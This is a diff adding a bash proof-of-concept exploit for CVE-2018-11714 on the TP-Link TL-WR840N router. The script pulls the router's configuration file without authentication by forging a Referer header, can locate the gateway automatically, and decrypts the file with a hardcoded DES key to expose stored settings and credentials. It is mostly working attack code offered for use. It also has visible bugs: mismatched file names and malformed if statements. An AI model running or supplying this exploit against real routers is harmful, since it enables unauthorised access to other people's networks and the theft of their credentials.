@@ -1,5 +1,48 @@
-echo -n "Enter Your Router IP Address : ";
-read ip;
-echo "curl -i -s -k -X GET -H 'Referer: http://$ip/mainFrame.htm' http://$ip/cgi/conf.bin > conf.bin" > get;
-sudo chmod +x get;
-./get;
+#!/bin/bash
+clear;
+echo -e "-----------------------------------------\n-   TPLINK TL-WR840N Proof Of Concept   -\n-       Based on CVE-2018-11714         -\n-         Do at your own risk!          -\n-----------------------------------------";
+echo -e "\n[ 1 ] Manual\n[ 2 ] Automatic Gateway Finder\n[ 3 ] Decrypt Config File\n[ x ] Exit\n";
+echo -n "$USER>";
+ read choise;
+
+##Manual IP Input
+if [ $choise -eq 1 ] then
+  echo -n "Enter Your Router IP Address : ";
+   read ip;
+  echo "curl -i -s -k -X GET -H 'Referer: http://$ip/mainFrame.htm' http://$ip/cgi/conf.bin > conf.bin" > get;
+  sudo chmod +x get;
+  ./get;
+fi
+
+##Automatic IP
+if [ $choise -eq 2 ] then
+   auto=$(route -n | grep 'UG[ \t]' | awk '{print $2}');
+   echo "curl -i -s -k -X GET -H 'Referer: http://$auto/mainFrame.htm' http://$auto/cgi/conf.bin > conf.bin" > get;
+   sudo chmod +x get;
+   ./get;
+fi
+
+##Decrypt
+if [ $choise = '3' ] then
+  clear;
+  echo -n "Enter Your Config File Location (Blank for default): ";
+   read file;
+  echo "Decrypting $file ...";
+  dd=$(dd bs=1 skip=144 if=$file of=config1.bin); $dd;
+  ssl=$(openssl enc -d -des-ecb -nopad -K 478DA50BF9E3D2CF -in config.bin > tmp.bin); $ssl;
+  sleep 2;
+  clear;
+  FILE=./tmp.bin
+   if test -f "$FILE"; then
+     echo "Decryption Complete. Now Open tmp.bin file for decrypted file.";
+   else
+     echo "Decryption failed. Please Try Again.";
+   fi
+fi
+
+##Exit
+if [ $choise = 'x' ]
+ then
+  clear;
+  exit;
+fi
